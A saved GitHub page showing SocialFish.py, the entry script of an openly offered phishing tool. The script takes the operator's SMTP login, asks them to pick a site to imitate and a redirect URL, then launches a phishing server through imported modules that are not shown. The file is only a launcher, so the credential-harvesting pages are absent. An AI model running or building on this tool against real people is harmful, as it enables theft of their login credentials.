
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://assets-cdn.github.com">
  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
  <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1" media="(device-height: 568px)">
  <meta name="selected-link" value="repo_source">

  
<meta name="octolytics-dimension-device" content="mobile" />
<meta name="octolytics-dimension-user_id" content="29824686" /><meta name="octolytics-dimension-user_login" content="UndeadSec" /><meta name="octolytics-dimension-repository_id" content="119437761" /><meta name="octolytics-dimension-repository_nwo" content="UndeadSec/SocialFish" /><meta name="octolytics-dimension-repository_public" content="true" /><meta name="octolytics-dimension-repository_is_fork" content="false" /><meta name="octolytics-dimension-repository_network_root_id" content="119437761" /><meta name="octolytics-dimension-repository_network_root_nwo" content="UndeadSec/SocialFish" /><meta name="octolytics-dimension-repository_explore_github_marketplace_ci_cta_shown" content="false" />


<meta name="octolytics-host" content="collector.githubapp.com" /><meta name="octolytics-app-id" content="github" /><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event" /><meta name="octolytics-dimension-request_id" content="A2F5:43D4:9B185B:EFA502:5BC6BE98" /><meta name="octolytics-dimension-region_edge" content="sea" /><meta name="octolytics-dimension-region_render" content="iad" /><meta name="octolytics-actor-id" content="44171087" /><meta name="octolytics-actor-login" content="9hac" /><meta name="octolytics-actor-hash" content="1210e2a7f48ceaff265c2f6fd75ee44feaa4fa9e1e112dc0be9c127e85fd4d63" />
<meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-pjax-transient="true" />



    <meta name="google-analytics" content="UA-3769691-2">

  <meta class="js-ga-set" name="userId" content="3705a92ab31c76deff5cac7a9c051a3f" %>

<meta class="js-ga-set" name="dimension1" content="Logged In">

  <meta class="js-ga-set" name="dimension3" content="mobile">


  

  <title>SocialFish/SocialFish.py at master · UndeadSec/SocialFish</title>

  <link crossorigin="anonymous" media="all" integrity="sha512-mWeK6lLCFYWWZ4Ao4rBA3KGGGjkerkgNWAckp+jo2frQUUazI2FWd6omNEYWh2TecsVSJelZTxTs0LQAClhwKw==" rel="stylesheet" href="https://assets-cdn.github.com/assets/mobile-056dbaedb2063e09dd509b1f553c8dcf.css" />


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://assets-cdn.github.com/pinned-octocat.svg" color="#000000">
  <link rel="icon" type="image/x-icon" class="js-site-favicon" href="https://assets-cdn.github.com/favicon.ico">

<meta name="theme-color" content="#1e2327">



  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="page-responsive">
    


  <header class="Header f5 lh-default clearfix">
    <div class="p-responsive flex-justify-between">
        <div class="d-flex flex-justify-between flex-items-center position-absolute right-0 left-0 px-3 mt-1">
          <div class="d-flex mx-2"><!-- placeholder for hamburger --></div>
          <div class="px-3 overflow-hidden">
                <div class="css-truncate css-truncate-target width-fit">
    <svg class="octicon octicon-repo" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"/></svg>
    <strong>
      <a class="text-white" href="/UndeadSec">UndeadSec</a>
    </strong> /
    <strong>
      <a class="text-white" href="/UndeadSec/SocialFish">SocialFish</a>
    </strong>
  </div>

          </div>

          <div class="d-flex">
            
              <a class="position-relative notification-indicator ml-3" href="/notifications"
                    aria-label="You have no unread notifications"
                  data-ga-click="Mobile, tap, location:header; text:Notifications">
                <span class="mail-status "></span>
                <svg height="16" class="octicon octicon-bell" viewBox="0 0 14 16" version="1.1" width="14" aria-hidden="true"><path fill-rule="evenodd" d="M13.99 11.991v1H0v-1l.73-.58c.769-.769.809-2.547 1.189-4.416.77-3.767 4.077-4.996 4.077-4.996 0-.55.45-1 .999-1 .55 0 1 .45 1 1 0 0 3.387 1.229 4.156 4.996.38 1.879.42 3.657 1.19 4.417l.659.58h-.01zM6.995 15.99c1.11 0 1.999-.89 1.999-1.999H4.996c0 1.11.89 1.999 1.999 1.999z"/></svg>
              </a>
          </div>
        </div>


        <details class="details-reset">
          <summary class="mt-1 float-left position-relative user-select-none" data-ga-click="Mobile, tap, location:header; text:Hamburger">
            <svg height="24" class="octicon octicon-three-bars notification-indicator" viewBox="0 0 12 16" version="1.1" width="18" aria-hidden="true"><path fill-rule="evenodd" d="M11.41 9H.59C0 9 0 8.59 0 8c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zm0-4H.59C0 5 0 4.59 0 4c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zM.59 11H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1H.59C0 13 0 12.59 0 12c0-.59 0-1 .59-1z"/></svg>
          </summary>
              <div style="clear: both;">
        <div class="py-3">
          <div class="header-search scoped-search site-scoped-search js-site-search position-relative "
  role="search"
>
  <div class="position-relative">
    <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-site-search-form" data-scope-type="Repository" data-scope-id="119437761" data-scoped-search-url="/UndeadSec/SocialFish/search" data-unscoped-search-url="/search" action="/UndeadSec/SocialFish/search" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="&#x2713;" />
      <label class="form-control header-search-wrapper  js-chromeless-input-container">
            <a class="header-search-scope no-underline" href="/UndeadSec/SocialFish/blob/master/SocialFish.py">This repository</a>
        <input type="text"
          class="form-control header-search-input  js-site-search-focus js-site-search-field is-clearable"
          data-hotkey="s,/"
          name="q"
          value=""
          placeholder="Search"
          data-unscoped-placeholder="Search GitHub"
          data-scoped-placeholder="Search"
          autocapitalize="off"
          aria-label="Search this repository"
          >
          <input type="hidden" class="js-site-search-type-field" name="type" >
      </label>
</form>  </div>
</div>

        </div>
      <ul class="text-bold list-style-none p-0 m-0">
            <li>
              <a href="/" data-ga-click="Mobile, tap, location:header; text:Dashboard" class="js-selected-navigation-item HeaderNavlink py-2 mt-3">
                Dashboard
              </a>
            </li>
            <li>
              <a class="js-selected-navigation-item HeaderNavlink py-2" href="/pulls">
                Pull requests
</a>            </li>
            <li>
              <a class="js-selected-navigation-item HeaderNavlink py-2" href="/issues">
                Issues
</a>            </li>
              <li>
                <a class="js-selected-navigation-item HeaderNavlink py-2" data-ga-click="Mobile, tap, location:header; text:Marketplace" href="/marketplace">
                  Marketplace
</a>              </li>
          <li>
            <a href="/explore" data-ga-click="Mobile, tap, location:header; text:Explore" class="js-selected-navigation-item HeaderNavlink py-2">
              Explore
            </a>
          </li>
            <li>
              <a href="/9hac" data-ga-click="Mobile, tap, location:header; text:User avatar" class="js-selected-navigation-item HeaderNavlink py-2">
                <img class="avatar" src="https://avatars0.githubusercontent.com/u/44171087?s=40&amp;v=4" width="20" height="20" alt="@9hac" />
                9hac
              </a>
            </li>
            <li>
              <a href="/logout" data-ga-click="Mobile, tap, location:header; text:Sign out" class="HeaderNavlink py-2" style="padding-left: 2px;">
                <svg style="margin-right: 2px;" class="octicon octicon-sign-out v-align-middle" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M11.992 8.994V6.996H7.995v-2h3.997V2.999l3.998 2.998-3.998 2.998zm-1.998 2.998H5.996V2.998L2 1h7.995v2.998h1V1c0-.55-.45-.999-1-.999H.999A1.001 1.001 0 0 0 0 1v11.372c0 .39.22.73.55.91L5.996 16v-3.008h3.998c.55 0 1-.45 1-1V7.995h-1v3.997z"/></svg>
                Sign out
              </a>
            </li>
      </ul>
    </div>

        </details>
    </div>
  </header>

    



    




<div class="reponav-wrapper lh-default">
  <nav class="reponav js-reponav"
       itemscope
       itemtype="http://schema.org/BreadcrumbList">

    <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a class="js-selected-navigation-item selected reponav-item" itemprop="url" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages /UndeadSec/SocialFish" href="/UndeadSec/SocialFish">
        <span itemprop="name">Code</span>
        <meta itemprop="position" content="1">
</a>    </span>

      <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_issues repo_labels repo_milestones /UndeadSec/SocialFish/issues" href="/UndeadSec/SocialFish/issues">
          <span itemprop="name">Issues</span>
          <span class="Counter">17</span>
          <meta itemprop="position" content="2">
</a>      </span>

    <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links="repo_pulls checks /UndeadSec/SocialFish/pulls" href="/UndeadSec/SocialFish/pulls">
        <span itemprop="name">Pull requests</span>
        <span class="Counter">0</span>
        <meta itemprop="position" content="3">
</a>    </span>

      <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links=" /UndeadSec/SocialFish/projects" href="/UndeadSec/SocialFish/projects">
          <span itemprop="name">Projects</span>
          <span class="Counter">0</span>
          <meta itemprop="position" content="4">
</a>      </span>

      <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
        <a itemprop="url" class="js-selected-navigation-item reponav-item" data-selected-links=" /UndeadSec/SocialFish/wiki" href="/UndeadSec/SocialFish/wiki">
          <span itemprop="name">Wiki</span>
          <meta itemprop="position" content="5">
</a>      </span>

    <a class="js-selected-navigation-item reponav-item" data-selected-links="pulse /UndeadSec/SocialFish/pulse" href="/UndeadSec/SocialFish/pulse">
      Pulse
</a>
  </nav>
</div>

<div id="js-flash-container">


</div>




<div class="breadcrumb blob-breadcrumb">
  <label for="blob-history-checkbox" class="blob-history-label">
    <svg class="octicon octicon-history" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 13H6V6h5v2H8v5zM7 1C4.81 1 2.87 2.02 1.59 3.59L0 2v4h4L2.5 4.5C3.55 3.17 5.17 2.3 7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-.34.03-.67.09-1H.08C.03 7.33 0 7.66 0 8c0 3.86 3.14 7 7 7s7-3.14 7-7-3.14-7-7-7z"/></svg>
  </label>
  <span class="filetype-icon"><svg class="octicon octicon-file" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M6 5H2V4h4v1zM2 8h7V7H2v1zm0 2h7V9H2v1zm0 2h7v-1H2v1zm10-7.5V14c0 .55-.45 1-1 1H1c-.55 0-1-.45-1-1V2c0-.55.45-1 1-1h7.5L12 4.5zM11 5L8 2H1v12h10V5z"/></svg></span>
  <strong class="final-path">SocialFish.py</strong>
</div>


<input id="blob-history-checkbox"
       class="js-blob-history-checkbox blob-history-checkbox"
       type="checkbox"
       data-url="/UndeadSec/SocialFish/latest_commit/master/SocialFish.py">

<div class="blob-history">
  <a class="js-blob-history-link" href="/UndeadSec/SocialFish/commits/master/SocialFish.py">
    Loading latest commit…
</a></div>

  <div class="blob-file-content js-file-line-container">
    <div class="highlighted-blob tab-size" data-tab-size="8"><div class="code-body highlight"><pre><div class='line js-file-line' id='LC1'><span class="pl-c"><span class="pl-c">#</span>!/usr/bin/env python3</span></div><div class='line js-file-line' id='LC2'><br></div><div class='line js-file-line' id='LC3'><span class="pl-c"><span class="pl-c">#</span>#####################################################</span></div><div class='line js-file-line' id='LC4'><span class="pl-c"><span class="pl-c">#</span>                                                    #</span></div><div class='line js-file-line' id='LC5'><span class="pl-c"><span class="pl-c">#</span>       SOCIALFISH v2.0sharkNet                      #</span></div><div class='line js-file-line' id='LC6'><span class="pl-c"><span class="pl-c">#</span>                                                    #</span></div><div class='line js-file-line' id='LC7'><span class="pl-c"><span class="pl-c">#</span> by:     UNDEADSEC                                  #</span></div><div class='line js-file-line' id='LC8'><span class="pl-c"><span class="pl-c">#</span>                                                    #</span></div><div class='line js-file-line' id='LC9'><span class="pl-c"><span class="pl-c">#</span> Telegram Group: https://t.me/UndeadSec             #</span></div><div class='line js-file-line' id='LC10'><span class="pl-c"><span class="pl-c">#</span> YouTube Channel: https://youtube.com/c/UndeadSec   #</span></div><div class='line js-file-line' id='LC11'><span class="pl-c"><span class="pl-c">#</span> Twitter: https://twitter.com/A1S0N_                #</span></div><div class='line js-file-line' id='LC12'><span class="pl-c"><span class="pl-c">#</span>                                                    #</span></div><div class='line js-file-line' id='LC13'><span class="pl-c"><span class="pl-c">#</span>#####################################################</span></div><div class='line js-file-line' id='LC14'><br></div><div class='line js-file-line' id='LC15'><span class="pl-k">from</span> sys <span class="pl-k">import</span> <span class="pl-c1">exit</span>, version_info</div><div class='line js-file-line' id='LC16'><br></div><div class='line js-file-line' id='LC17'><span class="pl-k">if</span> version_info<span class="pl-k">&lt;</span>(<span class="pl-c1">3</span>,<span class="pl-c1">0</span>,<span class="pl-c1">0</span>):</div><div class='line js-file-line' id='LC18'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-c1">print</span>(<span class="pl-s"><span class="pl-pds">&#39;</span>[!] Please use Python 3. $ python3 SocialFish.py<span class="pl-pds">&#39;</span></span>)</div><div class='line js-file-line' id='LC19'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-c1">exit</span>(<span class="pl-c1">0</span>)</div><div class='line js-file-line' id='LC20'><br></div><div class='line js-file-line' id='LC21'><span class="pl-k">from</span> multiprocessing <span class="pl-k">import</span> Process</div><div class='line js-file-line' id='LC22'><br></div><div class='line js-file-line' id='LC23'><span class="pl-c"><span class="pl-c">#</span> Anti Newbie :)</span></div><div class='line js-file-line' id='LC24'><span class="pl-k">try</span>:</div><div class='line js-file-line' id='LC25'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">from</span> core.view <span class="pl-k">import</span> <span class="pl-k">*</span></div><div class='line js-file-line' id='LC26'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">from</span> core.pre <span class="pl-k">import</span> <span class="pl-k">*</span></div><div class='line js-file-line' id='LC27'><span class="pl-k">except</span>:</div><div class='line js-file-line' id='LC28'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">import</span> pip</div><div class='line js-file-line' id='LC29'>&nbsp;&nbsp;&nbsp;&nbsp;pip.main([<span class="pl-s"><span class="pl-pds">&#39;</span>install<span class="pl-pds">&#39;</span></span>, <span class="pl-s"><span class="pl-pds">&#39;</span>huepy<span class="pl-pds">&#39;</span></span>])</div><div class='line js-file-line' id='LC30'>&nbsp;&nbsp;&nbsp;&nbsp;pip.main([<span class="pl-s"><span class="pl-pds">&#39;</span>install<span class="pl-pds">&#39;</span></span>, <span class="pl-s"><span class="pl-pds">&#39;</span>wget<span class="pl-pds">&#39;</span></span>])</div><div class='line js-file-line' id='LC31'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">from</span> core.view <span class="pl-k">import</span> <span class="pl-k">*</span></div><div class='line js-file-line' id='LC32'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">from</span> core.pre <span class="pl-k">import</span> <span class="pl-k">*</span></div><div class='line js-file-line' id='LC33'>&nbsp;&nbsp;&nbsp;&nbsp;clear()</div><div class='line js-file-line' id='LC34'>&nbsp;&nbsp;&nbsp;&nbsp;</div><div class='line js-file-line' id='LC35'><span class="pl-k">from</span> core.phishingRunner <span class="pl-k">import</span> <span class="pl-k">*</span></div><div class='line js-file-line' id='LC36'><span class="pl-c"><span class="pl-c">#</span> from core.sites import site</span></div><div class='line js-file-line' id='LC37'><span class="pl-k">from</span> core.menu <span class="pl-k">import</span> main_menu</div><div class='line js-file-line' id='LC38'><span class="pl-k">from</span> core.email <span class="pl-k">import</span> objsmtp</div><div class='line js-file-line' id='LC39'><span class="pl-k">from</span> smtplib <span class="pl-k">import</span> <span class="pl-k">*</span></div><div class='line js-file-line' id='LC40'><br></div><div class='line js-file-line' id='LC41'><span class="pl-k">def</span> <span class="pl-en">main</span>():</div><div class='line js-file-line' id='LC42'>&nbsp;&nbsp;&nbsp;&nbsp;head()</div><div class='line js-file-line' id='LC43'>&nbsp;&nbsp;&nbsp;&nbsp;checkEd()    </div><div class='line js-file-line' id='LC44'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">try</span>:</div><div class='line js-file-line' id='LC45'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkmail()</div><div class='line js-file-line' id='LC46'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">except</span> (SMTPAuthenticationError,<span class="pl-c1">ValueError</span>):</div><div class='line js-file-line' id='LC47'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-c1">print</span>(red(<span class="pl-s"><span class="pl-pds">&#39;</span> [!] Your authentication failed<span class="pl-pds">&#39;</span></span>))</div><div class='line js-file-line' id='LC48'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">except</span> <span class="pl-c1">IndexError</span>:</div><div class='line js-file-line' id='LC49'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-c1">print</span>(red(<span class="pl-s"><span class="pl-pds">&#39;</span> [!] this domain is not supported<span class="pl-pds">&#39;</span></span>))</div><div class='line js-file-line' id='LC50'><br></div><div class='line js-file-line' id='LC51'>&nbsp;&nbsp;&nbsp;&nbsp;site <span class="pl-k">=</span> main_menu()</div><div class='line js-file-line' id='LC52'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">while</span> <span class="pl-c1">True</span>:</div><div class='line js-file-line' id='LC53'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;custom <span class="pl-k">=</span> <span class="pl-c1">input</span>(cyan(<span class="pl-s"><span class="pl-pds">&#39;</span><span class="pl-cce">\n</span> Insert a custom redirect url: &gt; <span class="pl-pds">&#39;</span></span>))</div><div class='line js-file-line' id='LC54'><br></div><div class='line js-file-line' id='LC55'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">if</span> <span class="pl-k">not</span> custom:</div><div class='line js-file-line' id='LC56'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">pass</span></div><div class='line js-file-line' id='LC57'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">else</span>:</div><div class='line js-file-line' id='LC58'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">break</span></div><div class='line js-file-line' id='LC59'>&nbsp;&nbsp;&nbsp;&nbsp;</div><div class='line js-file-line' id='LC60'>&nbsp;&nbsp;&nbsp;&nbsp;custom <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>http://<span class="pl-pds">&#39;</span></span> <span class="pl-k">+</span> custom <span class="pl-k">if</span> <span class="pl-s"><span class="pl-pds">&#39;</span>://<span class="pl-pds">&#39;</span></span> <span class="pl-k">not</span> <span class="pl-k">in</span> custom <span class="pl-k">else</span> custom</div><div class='line js-file-line' id='LC61'>&nbsp;&nbsp;&nbsp;&nbsp;loadModule(site.lower())</div><div class='line js-file-line' id='LC62'>&nbsp;&nbsp;&nbsp;&nbsp;runPhishing(site.lower(), custom)</div><div class='line js-file-line' id='LC63'><br></div><div class='line js-file-line' id='LC64'><span class="pl-k">if</span> <span class="pl-c1">__name__</span> <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>__main__<span class="pl-pds">&quot;</span></span>:</div><div class='line js-file-line' id='LC65'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">try</span>:        </div><div class='line js-file-line' id='LC66'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pre()</div><div class='line js-file-line' id='LC67'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main()</div><div class='line js-file-line' id='LC68'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PhishingServer()</div><div class='line js-file-line' id='LC69'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">except</span> <span class="pl-c1">KeyboardInterrupt</span>:</div><div class='line js-file-line' id='LC70'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end()</div><div class='line js-file-line' id='LC71'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-c1">exit</span>(<span class="pl-c1">0</span>)</div><div class='line js-file-line' id='LC72'>&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">finally</span>:</div><div class='line js-file-line' id='LC73'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="pl-k">if</span> objsmtp(): objsmtp().quit()</div></pre></div></div>
  </div>


  <footer class="clearfix">
    <div class="container">
      <a href="#"><svg height="32" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg></a>

      <ul class="clearfix">
        <li>
          <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-mobile-preference-form" action="/site/mobile_preference" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" /><input type="hidden" name="authenticity_token" value="R7v++FrL8lMaHx81rDk4t2MkWUDQpG/F0dcyDjCnuzzoUwomdvORJtD2aUWdl6/m2yz7Hvwn7LU4VgZvPerSQA==" />
            <input type="hidden" name="mobile" value="false">
            <input type="hidden" name="anchor" class="js-mobile-preference-anchor-field">

            <button type="submit" class="switch-to-desktop" data-ga-click="Mobile, switch to desktop, switch button">
              Desktop version
            </button>
</form>        </li>
        <li>
          <a href="/logout" data-ga-click="Mobile, tap, location:header; text:Sign out">
            Sign out
          </a>
        </li>
      </ul>
    </div>
  </footer>
  

  </body>
</html>
